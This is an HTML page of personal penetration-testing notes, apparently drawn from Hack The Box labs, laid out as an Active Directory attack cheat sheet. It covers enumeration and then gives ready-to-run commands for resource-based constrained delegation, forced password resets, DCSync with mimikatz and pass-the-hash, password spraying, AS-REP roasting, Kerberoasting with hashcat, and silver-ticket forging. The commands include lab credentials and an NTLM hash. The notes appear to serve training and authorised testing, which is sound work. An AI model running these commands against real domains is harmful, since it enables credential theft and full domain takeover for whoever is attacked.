<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="main-container">
        <div class="sidebar">
                <h3>Quick content</h3>
                <ul id="sidebar-menu"></ul>
        </div>

    <div class="alternative-notion-container">
        <div class="alternative-notion-header">
            <h1>Active Directory (TCP/53 - DNS, TCP/389 - LDAP, TCP/636 - LDAPS, TCP/88 - Kerberos, TCP/445 - SMB)</h1>
            <p>A directory service developed by Microsoft that acts as a centralized database for managing and organizing resources in a network, particularly within Windows environments. This service relies on multiple ports</p>
        </div>
        <div class="notion-body">
            <h2 id="Enumeration">Enumeration</h2>
            <ul>
                <pre><code class="language-bash">crackmapexec smb 10.10.11.174  #Basic SMB enumeration to check if it vulnerable to SMB relay (signing:False). Additionally you can get the domain name
crackmapexec winrm 10.10.11.250 -u USERNAME -p "PASSWORD"  #Check for winrm </code></pre>

            <p>To dump all ldap information</p>
            <pre><code class="language-bash">ldapsearch -H ldap://DOMAIN_NAME -D 'USER@DOMAIN_NAME' -w 'PASSWORD' -b 'dc=DOMAIN_NAME,dc=SECOND_DOMAIN_NAME'</code></pre>
            <p>Another tool to dump itneresting information is windapsearch.py</p>
            <pre><code class="language-bash">python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -u</code></pre>
            
            <h3>User enumeration</h3>
            <ul>
                <p>User enumeration via ldapsearch </p>
                <pre><code class="language-bash">ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "</code></pre>
                <p>User enumration via SID</p>
                <pre><code class="language-bash">impacket-lookupsid anonymous@10.10.11.35 -no-pass</code></pre>
                <p>Once you have an username you can rid-brute</p>
                <pre><code class="language-bash">crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --rid-brute #Once you have a user you can rid-brute to show all users
crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --users</code></pre>
            </ul>

                
                


                <h3>Rpcclient</h3>
                <ul>
                    <p>Null sesion with rpcclient in order to enumerate users</p>
                    <pre><code class="language-bash">rpcclient -U "" 10.10.11.51 -N</code></pre>
                    <p>Once inside, user enumeration</p>
                    <pre><code class="language-bash">enumdomusers #Enumerates all domain users.
srvinfo #Server information.
enumdomains #Enumerate all domains that are deployed in the network.
querydominfo #Provides domain, server, and user information of deployed domains.
netshareenumall #Enumerates all available shares.
netsharegetinfo $sharename #Provides information about a specific share.
queryuser RID  #Provides information about a specific user.</code></pre>
                </ul>

                <h3> BloodHound </h3>
                <ul>
                <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
                <pre><code class="language-bash">bloodhound-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
                
                <p>Inside bloodhound panel it is important to check the following Pre-build Searches</p>
                <ul>
                    <li> All kerberoasteable users</li>
                    <li> Shortest paths to system trusted for unconstrained delegation (In case you see a user this one can be the entry vector)</li>
                    <li> Shortest paths to domain admins (In case you see a user this one can be the entry vector)</li> 
                </ul>

                <p> Default groups and users have Object ID over 500 so in case you see and object with priveleges that is not default it may be an entry vector</p>
                <p> Ej: Object ID:S-1-5-21-1677581083-3380853377-188903654-<b>1103</b></p>

                <p> In case you see permision <b>"(GenericAll/GenericWrite/WriteDacl/WriteProperty/etc)"</b> in a group that is not default it may be suspicious. It that case click on it and follow the commands it says</p>
                </ul>
                <h3> Basic AD commands </h3>
                <ul>
                <p>Show all users in the AD</p>
                <pre><code class="language-powershell">Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties SamAccountName, LastKnownParent |
Select-Object Name, SamAccountName, LastKnownParent</code></pre>
                <p>Restore the user based on the GUID. Previously you need to find a command to show thr GUID of certain user</p>
<pre><code class="language-powershell">$guid = [guid]"938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
Restore-ADObject -Identity $guid</code></pre>
                <p>Getting winlogon credentials</p>
                <pre><code class="language-powershell">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" </code></pre>
                
                <h3>Acquiring password policy</h3>
                <p>Here we list some ways of acquiring</p>
                <pre><code class="language-powershell">crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
rpcclient $> getdompwinfo
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
net accounts #In case you have access to a computer
PS C:\htb> import-module .\PowerView.ps1 & Get-DomainPolicy</code></pre>

                 

                
            </ul>
                
                <h3></h3>
                
            </ul>

            <h2 id="Enumerating security controls">Enumerating security controls</h2>
            <ul>
                <h3>Windows Defender</h3>
                <ul>
                <p>In order to check if windows defender is active we could use the following command</p>
                <pre><code class="language-powershell">Get-MpComputerStatus</code></pre>
                </ul>
                
                <h3>AppLocker</h3>
                <ul>
                <p>App locker is a software for whitelisting programs on a computer. We can list the prohibited executables by using that in powershell</p>
                <pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre>
                <p>Here are listed all paths of powershell</p>
                <pre><code class="language-powershell">32-bit (x86) PowerShell executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
64-bit (x64) Powershell executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
32-bit (x86) Powershell ISE executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
64-bit (x64) Powershell ISE executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe</code></pre>    
                </ul>

                <h3>LAPS (Local Administrator Password Solution)</h3>
                <ul>
                    <p>LAPS is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. By using the following command we will be able to show the password expiration and if our user has rights the password in clear text</p>
                    <pre><code class="language-powershell">Get-LAPSComputers</code></pre>
                </ul>    
            </ul>

            </ul>
            <h2>Exploitation</h2>
            <ul>
                <h2 id="Certipy Attacks">Certipy Attacks</h2>
                <div class="banner">
                    <a class="cherry-banner" href="certipy.html">
                        <h2>   Check for more information ‚ÜóÔ∏è</h2>
                    </a>
                </div>
                <h2 id="Post exploitation attacks / Bloodhound related">Post exploitation attacks / Bloodhound related</h2>
                <ul>
                    <h3> Resource-based Constrained Delegation attack</h3>
                    <ul>
                        <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
                        <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
                        <p> The attack goes the following way</p>
                        <ul>
                            <li>The attacker creates or controls a machine account (FakePC$).</li>
                            <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
                            <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
                            <li>The KDC issues the ticket because delegation is allowed ‚Äî no need to know the administrator's password.</li>
                        </ul>
                        <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
                        <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
                        <p> Creating fake computer </p>
                        <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
                        <p>Modifiying delegation rights</p>
                        <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
                        <p>Getting the impersonated service ticket</p>
                        <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
                        <p> Exporting ticket and connecting to machine</p>
                    </ul>

                    <h3>Force Change password attack</h3>
                    <ul>
                        <p> An attacker has certain permissions on user object (like GenericWrite, WriteProperty, WriteOwner) which ables him to change the password of user without knowing it</p>
                        <p>To perform this attack you can follow commands that bloodhound provides (more or less becaouse i had to change one a bit)</p>
                        <p>Define our user passwords</p>
                        <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
                        <p>Change the owner of our victim user</p>    
                        <pre><code class="language-powershell">Set-DomainObjectOwner -Credential $Cred -Identity VICTIM_USER -OwnerIdentity ATTACKER_USER</code></pre>
                        <p>Change password of the user</p>
                        <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "VICTIM_USER" -Rights ResetPassword -PrincipalIdentity "ATTACKER_USER"</code></pre>
                        <p>Define the new password for the user</p>
                        <pre><code class="language-powershell">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></pre>
                        <p>Change user password</p>    
                        <pre><code class="language-powershell">Set-DomainUserPassword -Identity VICTIM_USER -AccountPassword $UserPassword -Credential $Cred</code></pre>    
                        <p>Check if password was changed</p>    
                        <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u VICTIM_USER -p 'Password123!'</code></pre>   
                    </ul>
                
                
                <h3>Dsync Attack</h3>
                <ul>
                    <p>Having in mind that DCs replicate their data using the protocol of AD replication we can take advantage of this function using a DCsync attack. Must have the following privileges over the domain</p>
                    <ul>
                        <li>GetChanges</li>
                        <li>GetChangesAll</li>
                    </ul>
                    <p>Upload mimikatz to the victim server and execute the following command. In case you are in powershell use the " since the software begins to loop if not using it</p>
                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                    <pre><code class="language-powershell">.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator exit"</code></pre>
                    <p>Capture the has NTLM and usit to pass the hash in psexec</p>
                    <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>
                    <p>or</p>
                    <pre><code class="language-bash">wmiexec.py DOMAIN.local/USERNAME:'PASSWORD'@IP</code></pre>
                </ul>

                

                <h3>Generic Descendent Object Takeover</h3>
                <ul>
                    <p>In case you found that you have <b>GenricAll</b> permision over an OU you could perform an object Takeover which grants you the control of all the objects inside the OU</p>
                    <pre><code class="language-bash">dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'mypassword'</code></pre>
                </ul>
                </ul>
                
                <h2 id="Kerberos Attacks">Kerberos Attacks</h2>
                <p>Kerberos works emiting tickets using the KDC (Key Distribution Center). There are two kinds of tickets</p>
                    <p><b>TGT (Ticket Granting Ticket)</b> -> Emited by KDC and allows to request more tickets</p>
                    <p><b>TGS (Ticket Granting Service)</b> -> Service tickets used to authenticate against an specific service (MSSQL, CIFS, HTTP) </p>
                    <p>Every Service has a related SPN (Service Principal Name) which key is related with the hash of the service account</p>
                <ul>

                    <h3> Kerbrute </h3>
                    <ul>
                        <p>User enumeration</p>
                        <pre><code class="language-bash">kerbrute userenum --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt </code></pre>

                        <p>Password spray (One password a lot of users)</p>
                        <pre><code class="language-bash">kerbrute passwordspray --dc 10.10.11.69 -d fluffy.htb users.txt Password@1</code></pre>
                        <ul>
                            <p>Akternative in windows (\DomainPasswordSpray.ps1)</p>
                            <pre><code class="language-powershell"> Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile success -ErrorAction SilentlyContinue</code></pre>
                        </ul>
                        <p>Brute user (One user a lot of passwords)</p>
                        <pre><code class="language-bash">kerbrute bruteuser --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt john </code></pre>
                    </ul>

                    <h3>AS-REP Roasting Attack</h3>
                    <ul>
                        <p>Request hashes of AD accounts that have enabled the flag "Do not requiere Kerberos preauthentication". In that case an attacker can request a kerberos ticket without having the password for the user</p>
                        <pre><code class="language-bash"> impacket-GetNPUsers -no-pass -usersfile users.txt DOMAIN.LOCAL/</code></pre>
                        <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                        <pre><code class="language-bash">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                        <p>Show the hash</p>
                        <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>  
                    </ul>
                    <h3>Kerberoasting Attack</h3>
                    <ul>
                        <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
                        <pre><code class="language-bash">impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request
impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user USERNAME</code></pre>

                        <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                        <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                        <p>Show the hash</p>
                        <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>  
                    </ul>

                    <h3>Ticket attacks</h3>
                    <ul>
                        <h3>Silver Ticket Attack üíø</h3>
                        <ul>
                            <p>Can be performed when an attack gains the NTLM hash of a service account of a SPN (SQL_SVC, svc_exchange...)</p>
                            <p>With that key we can create a TGS for that service</p>
                            <p>But, the ticket is false and is firmed using the key of the service therefor the service accepts as a valid ticket eventhough the ticket has no passed through the KDC</p>
                            <br>
                            <p>In order to perform this attack you'll need the following</p>
                            
                            <p>Generate HASH NTLM from the password of the service account. <a class="notion-link" href="https://www.browserling.com/tools/ntlm-hash">Use this website</a></p>
                            <p>Get domain SUID. Domain needs to be formatted and last part must be removed</p>
                            <pre><code class="language-bash">SELECT SUSER_SID('signed\mssqlsvc');</code></pre>
                            <p>Using ticketer to forge a ticket impersonating IT user </p>
                            <pre><code class="language-bash">ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \                  
-domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
-domain signed.htb \
-spn MSSQLSvc/dc01.signed.htb:1433 \
-user-id 1103 \
-groups 1105 \        
IT</code></pre>
                            <p>Remember that -user-id and -groups are from the user which you are impersonating. -user-id can be obtained from last part of domain SUID</p>    
                            <pre><code class="language-bash"> export KRB5CCNAME=/home/kali/Downloads/IT.ccache</code></pre>
                            <p>Login using the ticket exported</p>
                            <pre><code class="language-bash">mssqlclient.py dc01.signed.htb -k</code></pre>
                        </ul>

                        <h3>Golden Ticket Attack üìÄ</h3>
                        <ul>
                        </ul>

                        <h3>Diamon Ticket Attack üî∑</h3>
                        <ul>
                        </ul>
                    </ul>
                </ul>    
            </ul>        
        </div>
    </div>
</div>
</body>
<script>
    function generateMenu() {
        const headers = document.querySelectorAll('.alternative-notion-container h2');
        const sidebarList = document.querySelector('#sidebar-menu');

        headers.forEach(header => {
            if (!header.id) return;

            // Texto original del encabezado
            const headerText = header.textContent.trim();

            // Texto que aparecer√° en el men√∫
            let menuText = headerText;

            // Excepci√≥n espec√≠fica
            if (headerText.toLowerCase() === 'post exploitation attacks / bloodhound related') {
            menuText = 'Post exploitation';
            }

            // Crear elementos del men√∫
            const listItem = document.createElement('li');
            const link = document.createElement('a');
            link.textContent = menuText;
            link.setAttribute('href', `#${header.id}`);

            listItem.appendChild(link);
            sidebarList.appendChild(listItem);
        });
}


    // Asegurarse de que ambas funciones se ejecuten despu√©s de que todo el contenido est√© listo
    window.addEventListener('load', generateMenu);
</script>
</html>